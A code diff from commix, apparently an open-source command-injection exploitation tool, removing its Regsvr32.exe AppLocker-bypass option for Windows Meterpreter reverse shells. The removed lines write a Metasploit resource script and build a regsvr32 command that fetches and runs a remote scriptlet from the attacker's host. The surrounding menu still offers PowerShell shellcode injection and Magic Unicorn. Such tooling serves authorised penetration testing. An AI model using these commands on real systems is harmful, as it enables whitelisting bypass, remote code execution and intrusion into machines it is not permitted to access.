+++ src/core/shells/reverse_tcp.py
@@ -512,7 +512,6 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
-Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe application whitelisting bypass.
 \ncommix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
           if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS): 
@@ -522,8 +521,6 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
             output = "powershell_attack.rc"
           elif windows_reverse_shell == '2' :
             output = "powershell_attack.txt"
-          elif windows_reverse_shell == '3' :
-            output = "regsvr32_applocker_bypass_server.rc"
           else:
             err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
             print(settings.print_error_msg(err_msg))
@@ -603,24 +600,6 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
             except:
               print(settings.SINGLE_WHITESPACE)
             break
-
-          # Regsvr32.exe application whitelisting bypass
-          elif windows_reverse_shell == '3':
-            with open(output, 'w+') as filewrite:
-              filewrite.write("use exploit/windows/misc/regsvr32_applocker_bypass_server\n"
-                              "set payload " + payload + "\n"
-                              "set lhost " + str(settings.LHOST) + "\n"
-                              "set lport " + str(settings.LPORT) + "\n"
-                              "set srvport " + str(settings.SRVPORT) + "\n"
-                              "set uripath " + settings.URIPATH + "\n"
-                              "exploit\n\n")
-            if not settings.TARGET_OS == "win":
-              windows_only_attack_vector()
-              continue
-            else:
-              other_shell = "regsvr32 /s /n /u /i:http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH +".sct scrobj.dll"
-              msf_launch_msg(output)
-              break
       break
     
     # Web delivery script